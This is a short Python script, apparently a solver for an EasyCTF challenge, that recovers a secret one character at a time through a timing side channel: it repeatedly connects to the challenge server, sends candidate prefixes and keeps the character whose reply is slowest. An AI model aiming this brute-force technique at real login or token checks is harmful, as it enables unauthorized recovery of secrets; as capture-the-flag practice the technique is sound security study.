import socket
import sys
import re
import time

TCP_IP = 'c1.easyctf.com'
TCP_PORT = 12482

log = open("flagtime.log","wb")

# TODO: threads?

def get_time(guess):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    s.recv(1024)
    start_ = time.time()
    s.send(guess + b"\n")
    mid_ = time.time()
    s.recv(1024)
    end_ = time.time()
    log.write(b"%s,%f" % (guess, end_ - mid_))
    return end_ - mid_

def get_average_time(guess, number):
    guesses = []
    for _ in range(number):
        guesses.append(get_time(guess))
    return sum(guesses) / number

guess = b""
while True:
    best_char = None
    highest_time = 0

    for c in range(32, 127):
        this_guess = guess + bytes([c])
        avg_time = get_average_time(this_guess, 2)
        if avg_time > highest_time:
            best_char = c
            highest_time = avg_time

    guess += bytes([best_char])
    print("[+] Guess so far: %s" % guess)
